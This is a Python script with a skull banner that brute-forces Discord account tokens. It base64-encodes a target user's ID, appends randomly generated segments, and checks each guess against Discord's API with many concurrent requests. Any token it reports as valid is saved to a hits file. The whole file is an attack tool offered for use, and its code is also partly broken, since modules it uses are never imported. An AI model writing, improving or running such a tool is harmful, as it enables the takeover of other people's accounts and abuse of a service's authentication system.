import asyncio
import aiohttp
import base64
import random
import string
from colorama import Fore, init
init()

print(Fore.RED + """
                      :::!~!!!!!:.
                  .xUHWH!! !!?M88WHX:.
                .X*#M@$!!  !X!M$$$$$$WWx:.
               :!!!!!!?H! :!$!$$$$$$$$$$8X:
              !!~  ~:~!! :~!$!#$$$$$$$$$$8X:
             :!~::!H!<   ~.U$X!?R$$$$$$$$MM!
             ~!~!!!!~~ .:XW$$$U!!?$$$$$$RMM!
               !:~~~ .:!M"T#$$$$WX??#MRRMMM!
               ~?WuxiW*`   `"#$$$$8!!!!??!!!
             :X- M$$$$       `"T#$T~!8$WUXU~
            :%`  ~#$$$m:        ~!~ ?$$$$$$
          :!`.-   ~T$$$$8xx.  .xWW- ~""##*"
.....   -~~:<` !    ~?T#$$@@W@*?$$      /`
W$@@M!!! .!~~ !!     .:XUW$W!~ `"~:    :
#"~~`.:x%`!!  !H:   !WM$$$$Ti.: .!WUn+!`
:::~:!!`:X~ .: ?H.!u "$$$B$$$!W:U!T$$M~
.~~   :X@!.-~   ?@WTWo("*$$$W$TH$! `
Wi.~!X$?!-~    : ?$$$B$Wu("**$RM!
$R@i.~~ !     :   ~$$$$$B$$en:``
?MXT@Wx.~    :     ~"##*$$$$M~


░██╗░░░░░░░██╗░█████╗░░█████╗░██╗░░██╗░██████╗████████╗░█████╗░██████╗░███████╗  ████████╗██████╗░███████╗
░██║░░██╗░░██║██╔══██╗██╔══██╗██║░██╔╝██╔════╝╚══██╔══╝██╔══██╗██╔══██╗╚════██║  ╚══██╔══╝██╔══██╗██╔════╝
░╚██╗████╗██╔╝██║░░██║██║░░╚═╝█████═╝░╚█████╗░░░░██║░░░███████║██████╔╝░░███╔═╝  ░░░██║░░░██████╦╝█████╗░░
░░████╔═████║░██║░░██║██║░░██╗██╔═██╗░░╚═══██╗░░░██║░░░██╔══██║██╔══██╗██╔══╝░░  ░░░██║░░░██╔══██╗██╔══╝░░
░░╚██╔╝░╚██╔╝░╚█████╔╝╚█████╔╝██║░╚██╗██████╔╝░░░██║░░░██║░░██║██║░░██║███████╗  ░░░██║░░░██████╦╝██║░░░░░
░░░╚═╝░░░╚═╝░░░╚════╝░░╚════╝░╚═╝░░╚═╝╚═════╝░░░░╚═╝░░░╚═╝░░╚═╝╚═╝░░╚═╝╚══════╝  ░░░╚═╝░░░╚═════╝░╚═╝░░░░░░░░░░░░░░░""")
print()
print()

async def check_token(id_to_token, token):
    async with aiohttp.ClientSession() as session:
        headers = {'Authorization': token}
        async with session.get('https://discordapp.com/api/v9/auth/login', headers=headers) as response:
            if response.status == 200:
                print(Fore.GREEN + '[+] VALID' + ' ' + token)
                async with aiofiles.open('hit.txt', mode='a+') as f:
                    await f.write(f'{token}\n')
                return True
            else:
                print(Fore.RED + '[-] INVALID' + ' ' + token)
                return False

async def main(tasks):
    id_to_token = base64.b64encode(input("ID TO TOKEN --> ").encode("ascii"))
    id_to_token = str(id_to_token)[2:-1]

    tasks_list = []
    while True:
        token = id_to_token + '.' + ''.join(random.choices(string.ascii_letters + string.digits, k=4)) + '.' + ''.join(random.choices(string.ascii_letters + string.digits, k=25))
        tasks_list.append(check_token(id_to_token, token))
        if len(tasks_list) >= tasks:
            results = await asyncio.gather(*tasks_list)
            if any(results):
                print("Correct token found. Stopping...")
                break
            tasks_list = []

if __name__ == "__main__":
    while True:
        tasks_amount = int(input("Enter the number of threads you want to run (increases speed) default 100: "))
        try:
            asyncio.run(main(tasks_amount))
        except ConnectionResetError:
            print("ConnectionResetError occurred. Restarting...")
            subprocess.run(["start", "cmd", "/k", "python", "main.py"])


